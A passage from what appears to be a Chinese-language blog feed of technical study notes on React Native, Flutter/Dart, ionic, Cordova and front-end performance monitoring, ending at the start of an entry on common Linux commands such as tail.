didUpdateReactSubviews]</p><ul><li>给原生View添加子控件</li></ul></li><li><p>完成UI渲染</p></li></ul></li><li><p>通信机制</p><ul><li><p>OC生成一张模块配置表，包含所有模块和模块里的方法，根据特定的标识宏（RCT_EXPORT_MODULE()），将可以暴露的方法暴露给JS</p></li><li><p>通信流程</p><ul><li>①js调用OC模块暴露出来的方法</li><li>②把调用方法分解为ModuleName、MethodName、arguments，在丢给MessageQueue处理</li><li>③把js的callback函数缓存在MessageQueue的一个成员变量里面，同时生成一个CallbackID来代表callback；在通过保存在MessageQueue的模块配置表把ModuleName、MethodName转成ModuleID、MethodID</li><li>④把ModuleID、MethodID、CallbackID和其他参数传给OC（JavaScriptCore）</li><li>⑤OC接到消息，通过模块配置表拿到对于的模块和方法</li><li>⑥RCTModuleMethod对js传过来的参数进行处理</li><li>⑦OC模块方法执行完，执行block回调</li><li>⑧调用第6步中RCTModuleMethod生成的block</li><li>⑨block带着CallbackID和block传过来的参数去掉用js里的MessageQueue方法invokeCallbackAndReturnFlushedQueue</li><li>⑩MessageQueue通过CallbackID找到相应的js的callback方法</li><li>⑪调用callback方法，并把OC带过来的参数一起传过去完成回调</li></ul></li></ul></li><li><p>导航路由</p><ul><li><p>StackNavigator</p><ul><li><p>用来跳转页面和传递参数</p></li><li><p>参数</p><ul><li>RouteConfigs</li><li>StackNavigatorConfig</li></ul></li><li><p>navigation</p><ul><li><p>navigate</p><ul><li><p>跳转到其他页面</p></li><li><p>routeName</p><ul><li>导航器中配置的路由名称</li></ul></li><li><p>params</p><ul><li>传递参数到下一个页面</li></ul></li><li><p>action</p></li><li><p>示例</p><ul><li>this.props.navigation.navigate('Find', {param: 'i am the param'});</li></ul></li></ul></li><li><p>state</p><ul><li><p>当前页面导航器的状态</p></li><li><p>params</p><ul><li>路由页面参数</li></ul></li><li><p>key</p><ul><li>路由页面id</li></ul></li><li><p>routeName</p><ul><li>路由页面名称</li></ul></li></ul></li><li><p>setParams</p><ul><li>更改路由的参数</li><li>在组件挂载完成之后注册</li><li>componentDidMount() {</li><li>this.props.navigation.setParams({param:'i am the new param'})</li></ul></li><li><p>goBack</p><ul><li><p>返回</p></li><li><p>goBack()</p><ul><li>回退到上一个页面</li></ul></li><li><p>goBack(null)</p><ul><li>回退到任意一个页面</li></ul></li><li><p>goBack('pathName')</p><ul><li>回退到指定页面</li></ul></li></ul></li><li><p>dispatch</p><ul><li>发送一个action</li></ul></li></ul></li></ul></li><li><p>TabNavigator</p><ul><li>类似底部导航栏，用来在同一屏切换不同页面</li></ul></li><li><p>DrawerNavigator</p><ul><li>侧滑菜单导航栏，用于轻松设置带抽屉的屏幕</li></ul></li></ul></li><li><p>拆包</p><ul><li><p>目的</p><ul><li>解决jsbundle体积过大</li><li>按需分步加载，提高加载效率</li><li>提高热更新包diff/load效率</li></ul></li><li><p>jsbundle组成</p><ul><li><p>头部（Polyfills）</p><ul><li>定义基本的JS环境</li><li>主要是define，require等全局模块的定义</li><li><strong>d()函数、</strong>r()函数、<strong>DEV</strong> 变量等</li></ul></li><li><p>中部（Module定义）</p><ul><li>模块定义，RN框架和业务的各个模块定义</li><li>使用__d()函数定义所有用到的模块</li><li>该函数为每个模块赋予了一个模块ID，模块之间的依赖关系都是通过这个ID进行关联的</li></ul></li><li><p>尾部（Require调用）</p><ul><li>引擎初始化和入口函数执行</li><li>使用__r()函数引用根模块</li></ul></li></ul></li><li><p>拆包方案</p><ul><li><p>diff and patch</p><ul><li>将jsbundle通过diff，生成common和每个业务的patch包</li><li>然后在APP运行时对common和patch合并成执行的jsbundle</li></ul></li><li><p>修改RN的bundle命令打包流程，使得直接生成common+business包</p></li><li><p>修改RN的unbundle命令，生成common+business包</p></li><li><p>使用metro拆包</p><ul><li><p>基础包和业务包打包</p><ul><li><p>抽离公共组件到base.js</p></li><li><p>base.js入口打包</p><ul><li>输出common.jsbundle</li></ul></li><li><p>index.js入口打包</p><ul><li>输出business.jsbundle</li></ul></li></ul></li><li><p>差异包打包</p><ul><li><p>business.jsbundle基于common.jsbundle打差异包</p></li><li><p>实现思路</p><ul><li>business.jsbundle逐行扫描</li><li>扫描内容如在common.jsbundle中没找到，用数组存放</li><li>将数组转换为数据保存到差异包patch.jsbundle</li></ul></li></ul></li></ul></li></ul></li></ul></li><li><p>热更新</p><ul><li>前端业务代码提交入库</li><li>基于热更新平台拆分当前项目</li><li>资源打包上线CDN服务器</li><li>前端资源添加版本号管理</li><li>客户端拉取前端RN资源动态更新</li></ul></li></ul></li></ul><h3 id="Flutter-1"><a href="#Flutter-1" class="headerlink" title="Flutter"></a>Flutter</h3><ul><li><p>Flutter发展历程</p><ul><li>2014.10 - Flutter的前身Sky在GitHub上开源 </li><li>2015.10 - 经过一年的开源，Sky正式改名为Flutter</li><li>2017.5 - Google I/O正式向外界公布了Flutter，这个时候Flutter才正式进去大家的视野</li><li>2018.6 - 距5月Google I/O 1个月的时间，Flutter1.0预览版</li><li>2018.12 - Flutter1.0发布，它的发布将大家对Flutter的学习和研究推到了一个新的起点</li><li>2019.2 - Flutter1.2发布主要增加对web的支持</li></ul></li><li><p>简介</p><ul><li>Flutter 是 Google推出并开源的移动应用开发框架</li><li>主打跨平台、高保真、高性能</li><li>开发者可以通过 Dart语言开发 App，一套代码同时运行在 iOS 和 Android平台</li><li>Flutter提供了丰富的组件、接口，开发者可以很快地为 Flutter添加 native扩展</li><li>同时 Flutter还使用 Native引擎渲染视图，这无疑能为用户提供良好的体验</li></ul></li><li><p>框架</p><ul><li><p>Framework</p><ul><li>纯 Dart实现的 SDK，类似于 React在 JavaScript中的作用</li><li>它实现了一套基础库， 用于处理动画、绘图和手势</li><li>基于绘图封装了一套 UI组件库</li><li>根据 Material 和Cupertino两种视觉风格区分开来</li></ul></li><li><p>Engine</p><ul><li><p>纯 C++实现的 SDK</p></li><li><p>包括</p><ul><li>Skia引擎</li><li>Dart运行时</li><li>文字排版引擎等</li></ul></li><li><p>它是 Dart的一个运行时，它可以以 JIT 或者 AOT的模式运行 Dart代码</p></li><li><p>这个运行时还控制着 VSync信号的传递、GPU数据的填充等，并且还负责把客户端的事件传递到运行时中的代码</p></li></ul></li><li><p>Embedder</p><ul><li><p>Embedder是操作系统适配层</p></li><li><p>实现了</p><ul><li>渲染Surface设置</li><li>线程设置</li><li>平台插件等平台相关特性的适配</li></ul></li></ul></li></ul></li><li><p>组件渲染</p><ul><li><p>图像显示的基本原理</p><ul><li><p>显示器的CRT电子枪从上到下一行行扫描，扫描一行完成之后，显示器上就显示一帧画面，随后电子枪回到初始位置继续下一次扫描</p></li><li><p>水平扫描时，显示器会发出一个水平同步信号（HSync）</p></li><li><p>而当一帧画面绘制完成之后，电子枪恢复原位，准备下一次扫描之前，显示器会发出一个垂直同步信号（Vsync）</p></li><li><p>显示器以固定的频率刷新，这个刷新率就是Vsync信号产生的频率</p></li><li><p>图像的显示需要CPU、GPU和显示器一起配合完成</p><ul><li>CPU负责图像数据计算</li><li>GPU负责图像数据渲染</li><li>显示器则负责最终图像显示</li></ul></li><li><p>CPU把计算好的需要显示的内容交给GPU</p></li><li><p>由GPU完成渲染后放入帧缓冲区</p></li><li><p>随后视频控制器根据垂直同步信号（Vsync）以每秒60次的速度</p></li><li><p>从帧缓冲区读取帧数据交由显示器完成图像显示</p></li></ul></li><li><p>Flutter绘制原理</p><ul><li><p>渲染流程</p><ul><li>Dart</li><li>|</li><li>GPU</li><li>|</li><li>|</li><li>Compositor</li><li>Skia</li><li>GPU</li></ul></li><li><p>渲染流程1</p><ul><li>GPU的VSync信号同步给到UI线程</li><li>UI线程使用Dart来构建抽象的视图结构（这里是Framework层的工作）</li><li>绘制好的抽象视图数据结构在GPU线程中进行图层合成（在Flutter Engine层的工作）</li><li>然后提供给Skia引擎渲染为GPU数据，最后通过OpenGL或者 Vulkan提供给 GPU</li></ul></li><li><p>UI界面绘图流程</p><ul><li><p>user Input</p><ul><li>用户输入是驱动视图更新的信号 如：滑动屏幕</li></ul></li><li><p>Animation</p><ul><li>触发动画进度更新</li></ul></li><li><p>Build</p><ul><li>框架开始build抽象视图数据</li></ul></li><li><p>Layout</p><ul><li>视图布局</li></ul></li><li><p>Paint</p><ul><li>视图绘制</li></ul></li><li><p>Composite</p><ul><li>视图合成</li></ul></li><li><p>Restorize</p><ul><li>最后进行光栅化处理把数据生成一个个真正的像素填充数据</li></ul></li></ul></li></ul></li></ul></li><li><p>Dart语言（基础）</p><ul><li><p>简介</p><ul><li>Dart 语言在2011年10月由 Google 发布</li><li>是一种 易于学习、 易于扩展、并且可以部署到 任何地方 的 应用 编程 语言</li><li>设计的初衷是用来替换javascript的，所以刚开始Dart也就是用来作<br>为浏览器脚本运行在浏览器中的，但是一直没有被广大开发者重视。</li><li>Google并没有放弃Dart，又Dart编写孵化了一个移动开发框架Sky，</li><li>之后又被命名为Flutter，进入了移动跨平台开发的领域</li></ul></li><li><p>应用方向</p><ul><li><p>移动端开发</p><ul><li>核心是Flutter框架，它使用</li><li>Dart + C++ + Skia 开发，同</li><li>一份代码编写运行在 iOS 和</li><li>Android 上的应用</li></ul></li><li><p>浏览器端</p><ul><li>我们用Dart来写Web后，编译器会自动</li><li>将Dart文件编译为JavaScript文件进行</li><li>运行，只不过我们写的语法规范是Dart语法</li></ul></li><li><p>服务器端</p><ul><li>DartVM ：就是写服务端的应用。比如写个</li><li>http 的服务，对应用提供 api ，都是及其简单的事情。</li></ul></li></ul></li><li><p>环境配置</p><ul><li><p>手动安装</p><ul><li>下载地址：<a href="http://www.gekorm.com/dart-windows/">http://www.gekorm.com/dart-windows/</a></li></ul></li><li><p>配置环境变量</p><ul><li>将dart-sdk的bin路径添加到path环境变量中</li></ul></li><li><p>在vscode中安装Code Runner插件，来调试我们的dart代码</p></li><li><p>安装stagehand</p><ul><li>pub global activate stagehand</li></ul></li><li><p>创建dart项目</p><ul><li>stagehand dart-demo</li></ul></li><li><p>获取依赖包</p><ul><li>pub get</li></ul></li></ul></li><li><p>常用内置类型</p><ul><li><p>String</p><ul><li>Dart 字符串是 UTF-16 编码的字符序列，可以使用单引号或者双引号来创建字符串</li><li>可以使用三个单引号或者双引号创建多行字符串对象</li><li>可以使用 r 前缀创建”原始raw”字符串</li><li>可以在字符串中使用表达式： ${expression},如果表达式是一个标识符，可以省略 {}，如果表达式的结果为一个对象，则 Dart 会调用对象的 toString() 函数来获取一个字符串</li></ul></li><li><p>Numbers</p><ul><li>int : 整数值</li><li>double : 64-bit双精度浮点数</li><li>int和double是num的子类</li></ul></li><li><p>Booleans</p><ul><li>bool对象未初始化的默认值是null</li></ul></li><li><p>Lists</p><ul><li>Dart中的数组称为List</li></ul></li><li><p>Maps</p><ul><li>map是一个关联键和值的对象</li><li>键和值都可以是任何类型的对象</li><li>每个键只出现一次</li></ul></li></ul></li><li><p>变量声明</p><ul><li><p>var</p><ul><li>类似于JavaScript中的var</li><li>它可以接收任何类型的变量</li><li>但最大的不同是Dart中var变量一旦赋值，类型便会确定，则不能再改变其类型</li><li>Dart本身是一个强类型语言</li><li>任何变量都是有确定类型的</li></ul></li><li><p>dynamic</p><ul><li>dynamic与var一样都是关键词</li><li>声明的变量可以赋值任意对象</li><li>dynamic与Object相同之处在于,他们声明的变量可以在后期改变赋值类型</li><li>dynamic声明的对象编译器会提供所有可能的组合</li></ul></li><li><p>Object</p><ul><li>Object 是Dart所有对象的根基类</li><li>也就是说所有类型都是Object的子类</li><li>包括Function和Null</li><li>所以任何类型的数据都可以赋值给Object声明的对象</li><li>Object声明的对象只能使用Object的属性与方法, 否则编译器会报错</li></ul></li><li><p>final</p><ul><li>一个 final 变量只能被设置一次</li><li>final变量在第一次使用时被初始化</li><li>被final或者const修饰的变量，变量类型可以省略</li></ul></li><li><p>const</p><ul><li>const 变量是一个编译时常量</li><li>不能更改</li></ul></li></ul></li><li><p>函数</p><ul><li>函数声明</li><li>对于只包含一个表达式的函数，可以使用简写语法</li><li>函数作为变量</li><li>函数作为参数传递</li><li>可选的位置参数</li><li>可选的命名参数</li><li>参考链接：<a href="https://book.flutterchina.club/chapter1/dart.html">https://book.flutterchina.club/chapter1/dart.html</a></li></ul></li><li><p>类class</p><ul><li><p>使用类成员</p><ul><li>对象的成员包括函数和数据(分别是方法和实例变量)</li><li>你调用一个方法时，你在一个对象上调用它:这个方法可以访问那个对象的函数和数据</li><li>使用点(.)引用实例变量或方法</li><li>使用?.而不是.为了避免最左边的操作对象为空时出现异常</li></ul></li><li><p>使用构造函数</p><ul><li>可以使用一个创建函数来创建对象</li><li>构造函数的名字可以是ClassName或者ClassName.indentifier</li></ul></li><li><p>构造函数</p><ul><li>通过创建一个与其类同名的函数来声明一个构造函数</li><li>最常见的构造函数形式——生成构造函数——创建了一个类的新实例</li><li>this关键词引用到当前的对象</li></ul></li><li><p>抽象类</p><ul><li>Dart抽象类主要用于定义标准，子类可以继承抽象类，也可以实现抽象类接口</li><li>抽象类通过abstract 关键字来定义</li><li>Dart中的抽象方法不能用abstract声明，Dart中没有方法体的方法我们称为抽象方法</li><li>如果子类继承抽象类必须得实现里面的抽象方法</li><li>如果把抽象类当做接口实现的话必须得实现抽象类里面定义的所有属性和方法</li><li>抽象类不能被实例化，只有继承它的子类可以</li><li>接口：使用implements关键字，一般使用抽象类定义接口。</li></ul></li></ul></li><li><p>包管理</p><ul><li><p>Dart的软件包管理器是pub。</p></li><li><p>托管软件包的存储库可以在<a href="https://pub.dartlang.org/">https://pub.dartlang.org/</a> 找到</p></li><li><ul><li>每个Dart应用程序都有一个pubspec.yaml文件，包含了项目依赖包配置 类似package.json</li></ul></li><li><p>操作命令</p><ul><li>pub get：获取应用程序依赖的所有包</li><li>pub upgrade：将所有依赖项升级到较新版本</li><li>pub build：构建应用</li></ul></li></ul></li><li><p>库</p><ul><li><p>自定义库</p><ul><li>import 'lib/mylib1.dart' as lib1;</li></ul></li><li><p>系统内置库</p><ul><li>import 'dart:math';</li><li>import 'dart:io';</li><li>import 'dart:convert';</li></ul></li><li><p>pub包管理系统中的库</p><ul><li>import 'package:dio/dio.dart';</li></ul></li></ul></li></ul></li><li><p>Widget与Element</p><ul><li><p>什么是Widget</p><ul><li>Flutter Widget采用现代响应式框架构建，中心思想是用widget构建你的UI</li><li>Widget描述了他们的视图在给定其当前配置和状态时应该看起来像什么</li><li>当Widget的状态发生变化时， Widget会重新构建UI，Flutter会对比前后变化的不同， 以确定底层渲染树从一个状态转换到下一个状态所需的最小更改</li><li>Widget的功能是“描述一个UI元素的配置数据”, Widget其实并不是表示最终绘制在设备屏幕上的显示元素，而它只是描述显示元素的一个配置数据</li></ul></li><li><p>Element </p><ul><li>Flutter中真正代表屏幕上显示元素的类是Element，也就是说Widget只是描述Element的配置数据</li></ul></li><li><p>基础Widget</p><ul><li><p>StatelessWidget</p><ul><li>StatelessElement 间接继承自Element类，与StatelessWidget相对应</li><li>StatelessWidget用于不需要维护状态的场景</li><li>它通常在build方法中通过嵌套其它Widget来构建UI</li><li>在构建过程中会递归的构建其嵌套的Widget</li></ul></li><li><p>StatefulWidget</p><ul><li>和StatelessWidget一样，StatefulWidget也是继承自Widget类，并重写了createElement()方法</li><li>不同的是返回的Element 对象并不相同</li><li>StatefulWidget类中添加了一个新的接口createState()</li><li>createState() 用于创建和Stateful widget相关的状态，它在Stateful widget的生命周期中可能会被多次调用</li></ul></li><li><p>State</p><ul><li><p>一个StatefulWidget类会对应一个State类，State表示与其对应的StatefulWidget要维护的状态</p></li><li><p>State中的保存的状态信息可以</p><ul><li>在widget 构建时可以被同步读取</li><li>在widget生命周期中可以被改变，当State被改变时，可以手动调用其setState()方法通知Flutter framework状态发生改变，Flutter framework在收到消息后，会重新调用其build方法重新构建widget树，从而达到更新UI的目的</li></ul></li><li><p>常用属性</p><ul><li><p>widget</p><ul><li>它表示与该State实例关联的widget实例</li><li>由Flutter framework动态设置</li></ul></li><li><p>context</p><ul><li>StatefulWidget对应的BuildContext</li><li>作用同StatelessWidget的BuildContext</li></ul></li></ul></li><li><p>生命周期</p><ul><li><p>StatefulWidget launched</p></li><li><p>initState</p><ul><li>当Widget第一次插入到Widget树时会被调用</li><li>对于每一个State对象，Flutter framework只会调用一次该回调</li><li>通常在该回调中做一些一次性的操作，如状态初始化、订阅子树的事件通知等</li></ul></li><li><p>didChangeDependencies</p><ul><li>当State对象的依赖发生变化时会被调用</li></ul></li><li><p>build</p><ul><li><p>它主要是用于构建Widget子树的</p></li><li><p>会在如下场景被调用</p><ul><li>在调用initState()之后</li><li>在调用didUpdateWidget()之后</li><li>在调用setState()之后</li><li>在调用didChangeDependencies()之后</li><li>在State对象从树中一个位置移除后（会调用deactivate）又重新插入到树的其它位置之后</li></ul></li></ul></li><li><p>reassemble</p><ul><li>此回调是专门为了开发调试而提供的</li><li>在热重载(hot reload)时会被调用</li><li>此回调在Release模式下永远不会被调用</li></ul></li><li><p>didUpdateWidget</p><ul><li>在widget重新构建时</li><li>Flutter framework会调用Widget.canUpdate来检测Widget树中同一位置的新旧节点，然后决定是否需要更新</li><li>如果Widget.canUpdate返回true则会调用此回调</li></ul></li><li><p>deactivate</p><ul><li>当State对象从树中被移除时，会调用此回调</li></ul></li><li><p>dispose</p><ul><li>当State对象从树中被永久移除时调用</li><li>通常在此回调中释放资源</li></ul></li><li><p>StatefulWidget destoryed</p></li></ul></li></ul></li><li><p>基础组件</p><ul><li><p>Text</p><ul><li>Text用于显示简单样式文本，它包含一些控制文本显示样式的一些属性</li></ul></li><li><p>Image</p><ul><li>Flutter中，我们可以通过Image组件来加载并显示图片，Image的数据源可以是asset、文件、内存以及网络</li></ul></li><li><p>Container</p><ul><li>Container是Flutter里很常用的容器组件， Container可以创建矩形视觉元素</li></ul></li></ul></li><li><p>布局类组件</p><ul><li><p>线性布局</p><ul><li>Row</li><li>Column</li></ul></li><li><p>弹性布局</p><ul><li>Flex</li></ul></li><li><p>流式布局</p><ul><li>Wrap</li><li>Flow</li></ul></li><li><p>层叠布局</p><ul><li>Stack</li><li>Positioned</li></ul></li><li><p>对齐与相对定位</p><ul><li>Align</li></ul></li></ul></li></ul></li></ul></li></ul><h3 id="Weex"><a href="#Weex" class="headerlink" title="Weex"></a>Weex</h3><h3 id="小程序-1"><a href="#小程序-1" class="headerlink" title="小程序"></a>小程序</h3><h3 id="快应用-1"><a href="#快应用-1" class="headerlink" title="快应用"></a>快应用</h3><h3 id="ionic-1"><a href="#ionic-1" class="headerlink" title="ionic"></a>ionic</h3><ul><li><p>简介</p><ul><li>ionic是一个用来开发混合手机应用的，开源的，免费的代码库</li><li>可以优化html、css和js的性能，构建高效的应用程序</li><li>可以用于构建Sass和AngularJS的优化</li></ul></li><li><p>特点</p><ul><li>具有原生APP的卓越运行性能</li><li>可维护性高</li><li>漂亮的Ui设计</li><li>轻量级框架</li><li>具有强大的命令行工具</li><li>与AngularJS完美结合</li></ul></li><li><p>框架结构</p><ul><li><p>CSS框架</p><ul><li>提供原生App质感的CSS样式模拟</li><li>ionic这部分的实现使用了ionicons图标样式库</li></ul></li><li><p>JavaScript框架</p><ul><li>提供移动Web应用开发框架</li><li>ionic基于AngularJS基础框架开发</li><li>遵循AngularJS的框架约束</li><li>ionic使用AngularJS UI Router实现前端路由</li></ul></li><li><p>命令行/CLI </p><ul><li>命令行工具集用来简化应用的开发、构造和仿真运行</li><li>ionic命令行工具使用了 Cordova，依赖于平台SDK（Android & iOS）实现将移动web项目打包成原生app</li></ul></li></ul></li><li><p>基本布局</p><ul><li><a href="https://blog.csdn.net/xyphf/article/details/53580121">https://blog.csdn.net/xyphf/article/details/53580121</a></li></ul></li><li><p>交互通信</p><ul><li><a href="https://user-gold-cdn.xitu.io/2018/4/23/162f220686e4dba3?imageView2/0/w/1280/h/960/format/webp/ignore-error/1">https://user-gold-cdn.xitu.io/2018/4/23/162f220686e4dba3?imageView2/0/w/1280/h/960/format/webp/ignore-error/1</a></li></ul></li></ul><h3 id="Cordova-1"><a href="#Cordova-1" class="headerlink" title="Cordova"></a>Cordova</h3><ul><li><p>简介</p><ul><li>Cordova提供了一组设备相关的API</li><li>通过这组API，移动应用能够以JavaScript访问原生的设备功能，如摄像头、麦克风等</li><li>Cordova还提供了一组统一的JavaScript类库，以及为这些类库所用的设备相关的原生后台代码</li><li>Cordova支持如下移动操作系统：iOS, Android,ubuntu phone os, Blackberry, Windows Phone, Palm WebOS, Bada 和 Symbian</li></ul></li><li><p>架构</p><ul><li><p>Web APP端</p><ul><li><p>config.xml</p><ul><li><p>CLI初始化项目在主目录下生成</p></li><li><p>包含了整个app的一些基本信息</p><ul><li>appName</li><li>app入口文件</li><li>白名单</li><li>webview初始化的一些配置</li><li>plugin信息</li><li>图标资源信息</li></ul></li></ul></li><li><p>Resources</p></li><li><p>HTML、JS、CSS</p></li><li><p>cordova.js核心代码</p><ul><li><p>exec</p><ul><li>这是cordova 中js端的核心执行代码，所有的plugin的执行入口</li><li>successCallback -- 成功的回调</li><li>failCallback -- 失败的回调</li><li>service -- 所调用native plugin的类</li><li>action -- 所调用native plugin的类下的具体method</li><li>actionArgs -- 具体参数</li></ul></li><li><p>pokeNative</p><ul><li>JS通知Native调用native方法</li><li>通过Webview相关协议拦截前端URL</li><li>JS端通过iframe发送request的相关请求</li></ul></li><li><p>nativeCallback</p><ul><li>native处理完前端请求后触发回调的统一入口</li><li>以同步的方式来触发native -> js 的callBack</li></ul></li><li><p>callbackFromNative</p><ul><li>JS执行回调的地方</li><li>根据cordova.callBacks的map以及回调的callBackId 还有状态（success 或者 fail）来执行相应的回调函数</li><li>之后根据keepCallback来决定是否将该回调从callBacks的map中移除</li></ul></li></ul></li></ul></li><li><p>Native端</p><ul><li><p>cordova webview 引擎具体实现</p><ul><li><p>CDVViewController</p><ul><li>init --- 初始化程序</li><li>loadSettings --- 解析config.xml 将pluginsMap startplugin settings startPage等变量初始化到容器controller中，初始化plugin字典</li><li>viewDidLoad --- 先loadSettings，之后创建特殊存储空，根据CDVUIWebViewEngine初始化Webview，然后获取appURL加载index.html</li></ul></li><li><p>CDVUIWebViewEngine</p><ul><li>initWithFrame --- 创建webview</li><li>pluginInitialize --- 初始化webView中的一系列设置,创建delegate（CDVUIWebViewDelegate）</li><li>getConmmandInstance --- 获取command的实例</li></ul></li></ul></li><li><p>容器初始化以及plugin初始化</p><ul><li>Acceleromter</li><li>Geolocation</li><li>Carmera</li><li>Media</li><li>Device</li><li>Network</li><li>Contacts</li><li>Storage</li></ul></li></ul></li></ul></li><li><p>JS&Native通信</p><ul><li><p>通信原理</p><ul><li>保存Cordova_plugin.js的 插件文件名字和地址</li><li>插件的API呼出时，通过调用Cordova的exec模块将API的参数保存在CommandQueue的队列中。  CALLBACK则保存在JS侧的callbacks map里面</li><li>添加一个空的iframe,iframe的src则指向gap://ready</li><li>3的iframe的src设置以后，NATIVE侧UIWebviewDelegate#shouldStartLoadWithRequest则被呼出来</li><li>Webview的Delegatet判断gap://ready的情况下，则执行commandDelegate的处理</li><li>commandDelegate则从JS侧取出API的参数，内部实现则是通过 UIWebview＃stringByEvaluatingJavaScriptFromString的返回值 取得CommandQueue里面的参数转换成JSON数据</li><li>根据6的插件，执行NATIVE定义的插件实例</li><li>插件中，有CALLBACK的情况下，成功失败的结果通过UIWebview＃stringByEvaluatingJavaScriptFromString执行JS，JS端则根据传过来的CALLBACKID，从callbacks map取出回调函数并执行</li></ul></li><li><p>通信方式</p><ul><li>iframe的方法（默认）</li><li>xmlHttpRequest的方法（iOS5.x版本因为 -webkit-scroll的IFRAME有BUG，则推荐使用）</li></ul></li></ul></li><li><p>插件导入流程</p><ul><li><p>Native</p><ul><li>APP启动，MainViewController初始化之时，queue和command的DELEGATE初期化</li><li>config.xml文件解析，插件名设置到数组，插件文件和插件名设置到pluginMap,属性设置到setting</li><li>在Webview类里面，加载index.html,index.html里面加载cordova.js、开始初期化</li></ul></li><li><p>JS</p><ul><li>加载cordova.js时、内部的事件设置模块，NATIVE交互模块，初期化模块，插件加载</li><li>插件模块是cordova_plugins.js文件定义的插件文件地址，文件名保存的MAP</li><li>deviceready事件发布后，插件的API可以使用了</li><li>插件API执行后，模块MAP将插件文件加载，执行exec函数</li><li>在index.html里面添加一个空的iframe、指定src=gap://ready，通知到Nativie</li></ul></li></ul></li></ul><h3 id="PWA"><a href="#PWA" class="headerlink" title="PWA"></a>PWA</h3><h3 id="WebAssembly"><a href="#WebAssembly" class="headerlink" title="WebAssembly"></a>WebAssembly</h3><ul><li><a href="https://www.wasm.com.cn/">https://www.wasm.com.cn/</a></li></ul><h3 id="Electron"><a href="#Electron" class="headerlink" title="Electron"></a>Electron</h3><h3 id="VasSonic"><a href="#VasSonic" class="headerlink" title="VasSonic"></a>VasSonic</h3><h3 id="QT"><a href="#QT" class="headerlink" title="QT"></a>QT</h3><h2 id="性能优化和监控-1"><a href="#性能优化和监控-1" class="headerlink" title="性能优化和监控"></a>性能优化和监控</h2><h3 id="性能优化（基础）"><a href="#性能优化（基础）" class="headerlink" title="性能优化（基础）"></a>性能优化（基础）</h3><ul><li><p>内容层面</p><ul><li><p>DNS解析优化</p><ul><li>DNS缓存</li><li>减少DNS查找</li><li>keep-alive</li><li>适当的主机域名</li></ul></li><li><p>避免重定向</p></li><li><p>切分到多个域名</p></li><li><p>杜绝404</p></li></ul></li><li><p>网络传输阶段</p><ul><li><p>减少传输过程中的实体大小</p><ul><li>缓存</li><li>cookie优化</li><li>文件压缩</li></ul></li><li><p>减少请求的次数</p><ul><li>文件适当的合并</li><li>雪碧图</li></ul></li><li><p>异步加载</p></li><li><p>预加载、延后加载、按需加载</p></li></ul></li><li><p>渲染阶段</p><ul><li>js放底部，css放顶部</li><li>减少重绘和回流</li><li>合理使用Viewport 等meta头部</li><li>减少dom节点</li><li>BigPipe</li></ul></li><li><p>脚本执行阶段</p><ul><li>缓存节点，尽量减少节点的查找</li><li>减少节点的操作（innerHTML）</li><li>避免无谓的循环，break、continue、return的适当使用</li><li>事件委托</li></ul></li></ul><h3 id="大前端时代监控"><a href="#大前端时代监控" class="headerlink" title="大前端时代监控"></a>大前端时代监控</h3><ul><li><p>大前端时代前端监控的新变化</p><ul><li><p>大前端时代有哪些变化</p><ul><li>首先是Gmail的横空出世，开启了SPA的时代</li><li>Backbone/Angular等框架带来了MVVM模式的同时，也把JS从脚本语言提升到了工程语言</li><li>React Native/Weex把移动端开发从Hybrid模式进化到了跨端开发模式</li><li>Node.js问世为前端带来了更多的可能性</li></ul></li><li><p>前端变化给监控带来了什么样的改变</p><ul><li>传统监控模式能否适用于新的技术？比如PV统计</li><li>SPA模式下首屏如何计算？</li><li>跨端开发给监控带来什么什么挑战？</li><li>前端监控的上报模式在Node.js端是否合理？</li></ul></li><li><p>SPA模式下的PV统计问题</p><ul><li><p>技术升级、体验升级、PV下降？</p></li><li><p>原因</p><ul><li>页内路由代替了新的页面</li></ul></li><li><p>解决办法</p><ul><li>hash路由：监听hash change变化上报PV</li><li>非哈希路由：轻量hack pushState和replaceState</li></ul></li></ul></li><li><p>首屏统计</p><ul><li><p>第一阶段：自定义打点时期</p><ul><li>页头和首屏dom分别通过 new Date()打点</li><li>计算差值作为首屏时间</li><li>再加上setTimeout(new Date(), 0)标记首屏可交互时间</li></ul></li><li><p>第二阶段：W3C标准时期</p><ul><li><p>W3C性能小组引入了 Navigation Timing API 帮我们自动,精准的实现了性能测试的打点问题</p></li><li><p>Navigation Timing API </p><ul><li>卸载上一个页面</li><li>重定向</li><li>应用缓存</li><li>DNS域名解析</li><li>TCP链接</li><li>请求页面</li><li>响应</li><li>页面处理</li><li>触发load事件</li></ul></li></ul></li><li><p>第三阶段：SPA盛行导致W3C标准失去原来的意义</p></li><li><p>现阶段：用户感官指标FMP</p><ul><li>first meaning paint</li><li>主要内容可见时间</li></ul></li></ul></li></ul></li><li><p>前端监控的最佳实践</p><ul><li><p>主动监控</p><ul><li>配置告警规则</li><li>通过错误聚类模块，精准定位问题</li><li>增加性能样本分布统计</li><li>再手起刀落，修复bug</li></ul></li><li><p>慢会话追踪</p></li><li><p>搜索报错明细</p></li><li><p>出错行为还原</p></li></ul></li><li><p>58北斗监控实现</p></li></ul></script></p></li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 大前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux服务器常用命令</title>
      <link href="2021/01/03/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>2021/01/03/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.linuxcool.com/" target="_blank" rel="noopener">Linux命令大全</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在日常开发中我们会做一些服务器部署的工作，对于开发来说，运维部署并不是我们的专项；有些命令不是经常使用，很快就会忘记；在这总结一下日常部署时常用的一些运维命令。</p><h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><h2 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h2><p>tail 命令可用于查看文件的内容，有一个常用的参数 <strong>-f</strong> 常用于查阅正在改变的日志文件。</p><p><strong>命令格式：</strong></p><blockquote><p>tail [参数] [文件]</p></blockquote><p><strong>参数：</strong></p><ul><li>-f 循环读取</li><li>-q 不显示处理信息</li><li>-v 显示详细的处理信息</li><li>-c&lt;数目&gt; 显示的字节数</li><li>-n&lt;行数&gt; 显示文件的尾部 n 行内容</li><li>–pid=PID 